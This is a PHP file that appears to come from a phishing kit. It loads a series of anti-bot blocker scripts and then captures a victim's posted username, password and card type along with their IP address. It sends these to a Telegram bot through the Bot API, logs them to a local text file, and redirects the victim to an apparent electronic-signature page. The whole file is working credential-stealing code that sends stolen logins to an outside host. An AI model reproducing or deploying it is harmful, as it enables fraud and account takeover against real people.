<?php
include "./boots/anti1.php";
include "./boots/anti2.php";
include "./boots/anti3.php";
include "./boots/anti4.php";
include "./boots/anti5.php";
include "./boots/anti6.php";
include "./boots/anti7.php";
include "./boots/anti8.php";
include "./boots/anti9.php";
include "./boots/anti10.php";
include "./boots/anti11.php";
include "./boots/anti12.php";
include "./boots/anti13.php";
include "./boots/anti14.php";
include "./boots/anti15.php";
include "./boots/anti16.php";
include "./boots/blocker.php";
include "telegram.php";

$ip = getenv("REMOTE_ADDR");
$InfoDATE   = date("d-m-Y h:i:sa");

	$message .= '
----😈😈 JaK LOGIN 😈😈-----------
| TYPE = '.$_POST['valss'].'
|TYPCART = '.$_POST['vals'].'
| Usernam = '.$_POST['id_no'].'
| Password = '.$_POST['password'].'

------------ '.$ip.' ------------
😈😈BY-DarkneSs😈😈
';
file_get_contents("https://api.telegram.org/bot$tokn/sendMessage?chat_id=$id&text=" . urlencode($message)."" );
$file = fopen('sma.txt', 'a');
fwrite($file,$message);
    header("Refresh: 4; URL=firma_electronica.php");
    exit();
	
?>